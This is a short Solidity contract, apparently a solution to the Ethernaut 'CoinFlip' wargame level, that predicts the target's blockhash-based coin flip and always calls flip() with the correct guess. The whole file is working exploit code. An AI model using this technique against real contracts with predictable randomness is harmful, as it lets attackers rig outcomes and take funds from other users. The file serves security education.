pragma solidity 0.8.0;

import "../interfaces/ICoinFlip.sol";

contract CoinFlipHack {

    //The contract address of the actual "CounFlip" contract we want to hack
    ICoinFlip public contractToHack;

    constructor(address contractInstance) {
        contractToHack = ICoinFlip(contractInstance);
    }
    //Same number factor as in the CoinFlip Contract. This is for mimic the "random factor"
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    /// @notice Exploits the pseudorandomness generation vulnerability from the ethernain coin Flip
    /// @dev Using the same parametrs as in the contract, we can now mimic its random generation
    function hackFlip() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(blockValue / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return contractToHack.flip(side);
    }
}